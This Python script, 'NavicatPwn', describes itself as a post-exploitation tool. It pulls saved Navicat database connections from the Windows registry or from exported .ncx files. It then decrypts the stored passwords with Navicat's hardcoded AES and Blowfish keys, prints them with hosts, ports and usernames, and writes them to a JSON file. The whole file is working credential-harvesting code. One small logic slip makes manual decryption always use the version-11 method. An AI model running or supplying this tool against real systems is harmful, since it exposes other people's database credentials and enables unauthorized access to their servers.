import xml.etree.ElementTree as ET
import binascii
from base64 import b64decode
from Crypto.Cipher import AES, Blowfish
from Crypto.Util.Padding import unpad
import hashlib, argparse, sys, winreg, json

def logo():
    logo0 = r'''                                                                                            
                                ,,                                                                 
`7MN.   `7MF'                   db                   mm   `7MM"""Mq.        
  MMN.    M                                          MM     MM   `MM.                              
  M YMb   M  ,6"Yb.`7M'   `MF'`7MM  ,p6"bo   ,6"Yb.mmMMmm   MM   ,M9 `7M'    ,A    `MF'`7MMpMMMb.  
  M  `MN. M 8)   MM  VA   ,V    MM 6M'  OO  8)   MM  MM     MMmmdM9    VA   ,VAA   ,V    MM    MM  
  M   `MM.M  ,pm9MM   VA ,V     MM 8M        ,pm9MM  MM     MM          VA ,V  VA ,V     MM    MM  
  M     YMM 8M   MM    VVV      MM YM.    , 8M   MM  MM     MM           VVV    VVV      MM    MM  
.JML.    YM `Moo9^Yo.   W     .JMML.YMbmd'  `Moo9^Yo.`Mbmo.JMML.          W      W     .JMML  JMML.

      [+] Version: 1.1   [+] Author: @AabyssZG   [+] Github: github.com/AabyssZG/NavicatPwn
    '''
    print(logo0)

class NavicatPasswordDecryptor:
    def __init__(self, version=12):
        self.version = version
        self.aes_key = b'libcckeylibcckey'
        self.aes_iv = b'libcciv libcciv '
        self.blowfish_key = hashlib.sha1(b"3DC5CA39").digest()
        self.blowfish_iv = binascii.unhexlify("d9c7c3c8870d64bd")

    def decrypt(self, encrypted_password):
        """根据版本自动选择解密方法"""
        if not encrypted_password:
            return "无密码"
        try:
            if self.version == 11:
                return self._decrypt_navicat_11(encrypted_password).strip()
            elif self.version >= 12:
                return self._decrypt_navicat_12(encrypted_password).strip()
            else:
                return "[-] 不支持的版本"
        except Exception as e:
            return f"[-] 解密失败: {e}"

    def _decrypt_navicat_11(self, hex_password):
        """解密 Navicat 11 版本的密码 (Blowfish)"""
        try:
            encrypted_data = binascii.unhexlify(hex_password.lower())
            round_count = len(encrypted_data) // 8
            decrypted_password = b""
            current_vector = self.blowfish_iv
            cipher = Blowfish.new(self.blowfish_key, Blowfish.MODE_ECB)
            for i in range(round_count):
                block = encrypted_data[i * 8: (i + 1) * 8]
                decrypted_block = cipher.decrypt(block)
                decrypted_password += bytes(a ^ b for a, b in zip(decrypted_block, current_vector))
                current_vector = bytes(a ^ b for a, b in zip(current_vector, block))
            if len(encrypted_data) % 8:
                last_block = cipher.encrypt(current_vector)
                decrypted_password += bytes(a ^ b for a, b in zip(encrypted_data[round_count * 8:], last_block))
            return decrypted_password.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[-] 解密失败 (Navicat 11): {e}"

    def _decrypt_navicat_12(self, hex_password):
        """解密 Navicat 12 及以上版本的密码 (AES-128-CBC)"""
        try:
            encrypted_data = binascii.unhexlify(hex_password.lower())
            cipher = AES.new(self.aes_key, AES.MODE_CBC, self.aes_iv)
            decrypted_data = cipher.decrypt(encrypted_data)
            return decrypted_data.rstrip(b"\x00").decode('utf-8', errors='ignore')
        except Exception as e:
            return f"[-] 解密失败 (Navicat 12+): {e}"

def parse_ncx(file_path, version):
    """解析 Navicat 导出的 NCX 文件"""
    try:
        tree = ET.parse(file_path)
        root = tree.getroot()
        decryptor = NavicatPasswordDecryptor(version)
        connections = []

        for conn in root.findall(".//Connection"):
            db_type = conn.get("ConnType", "未知")  # 获取数据库类型
            host = conn.get("Host", "未知")
            port = conn.get("Port", "未知")
            database = conn.get("Database", "未知")
            username = conn.get("UserName", "未知")
            encrypted_password = conn.get("Password", "")
            password = decryptor.decrypt(encrypted_password) if encrypted_password else "无密码"

            # 过滤掉所有字段都是“未知”或“无密码”的无效行
            if not all(value in ["未知", "无密码", ""] for value in [host, port, database, username, password]):
                connections.append(f"[+] 数据库类型: {db_type}, IP: {host}, 端口: {port}, 数据库: {database}, 账号: {username}, 密码: {password}")
        
        return connections
    except ET.ParseError as e:
        print("[-] XML 解析错误: ", e)
        return []

def get_navicat_servers():
    base_key = r"Software\PremiumSoft"
    try:
        # 打开 PremiumSoft 目录
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, base_key) as key:
            sub_keys = []
            i = 0
            while True:
                try:
                    sub_keys.append(winreg.EnumKey(key, i))
                    i += 1
                except OSError:
                    break

            # 筛选 Navicat 相关的键
            navicat_keys = [k for k in sub_keys if "Navicat" in k]

            all_connections = []
            for navicat_key in navicat_keys:
                server_path = f"{base_key}\\{navicat_key}\\Servers"
                try:
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, server_path) as server_key:
                        j = 0
                        while True:
                            try:
                                server_name = winreg.EnumKey(server_key, j)
                                j += 1
                                connection = get_server_info(server_path, server_name)
                                if connection and connection.get("Password"):
                                    all_connections.append(connection)
                            except OSError:
                                break
                except FileNotFoundError:
                    continue  # 可能该版本没有 Servers 键

            return all_connections

    except FileNotFoundError:
        print("[-] Navicat 注册表项未找到")
        return []

def get_server_info(server_path, server_name):
    """ 读取单个 Navicat 连接的信息，并尝试解密密码 """
    full_path = f"{server_path}\\{server_name}"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, full_path) as key:
            connection = {"ConnectionName": server_name}
            fields = ["Host", "Port", "UserName", "Password", "Pwd"]

            for field in fields:
                try:
                    value, _ = winreg.QueryValueEx(key, field)
                    connection[field] = value
                except FileNotFoundError:
                    continue
            
            # 处理密码字段
            encrypted_password = connection.get("Password", connection.get("Pwd"))
            if encrypted_password:
                connection["EncryptedPassword"] = encrypted_password  # 保留原始加密密码
                decryptor = NavicatPasswordDecryptor(version=11)
                connection["Password"] = decryptor.decrypt(encrypted_password)  # 进行解密
                connection.pop("Pwd", None)  # 删除重复字段

                return connection

    except FileNotFoundError:
        return None

def save_to_json(data, filename="navicat_connections.json"):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    print(f"[+] 已导出解密后的连接信息到 {filename}")

def get_parser():
    parser = argparse.ArgumentParser(usage='python3 NavicatPwn.py',description='NavicatPwn: 针对Navicat的后渗透利用框架',)
    p = parser.add_argument_group('NavicatPwn 的参数')
    p.add_argument("-f", "--file", type=str, help="对导出的.ncx文件进行解密")
    p.add_argument("-r", "--reg", action="store_true", help="读取系统注册表获取保存的Navicat连接")
    p.add_argument("-p", "--passin", type=str, help="手动解密Navicat保存的密码")
    args = parser.parse_args()
    return args

def running(args):
    if args.file:
        version = int(input("\n[.] 请输入你要解密的版本（11/12）: "))
        if version == "":
            version = 12
        file_path = args.file
        connections = parse_ncx(file_path, version)
        
        if connections:
            print("[+] 成功解析指定文件，获取账密如下：")
            result = "\n".join(filter(None, connections))  # 过滤空行并保持换行
            print(result)
        else:
            print("[-] 未解析到任何数据库连接信息，请检查 .ncx 文件格式！")
    if args.reg:
        connections = get_navicat_servers()
        if connections:
            print("[+] 成功从注册表获取保存的 Navicat 连接")
            print(json.dumps(connections, indent=4, ensure_ascii=False))
            save_to_json(connections)
        else:
            print("[-] 未找到任何包含密码的 Navicat 连接")
    if args.passin:
        version = int(input("\n[.] 请输入你要解密的版本（11/12）: "))
        if version == "":
            version = 12
        try:
            decryptor = NavicatPasswordDecryptor(version=11)
            passout = decryptor.decrypt(args.passin)  # 进行解密
            print(f"[+] 解密成功，密码为 {passout}")
        except Exception as e:
            print(f"[-] 解密出现错误，报错内容为 {e}")
    else:
        sys.exit()

def main():
    logo()
    args = get_parser()
    running(args)

if __name__ == "__main__":
    main()
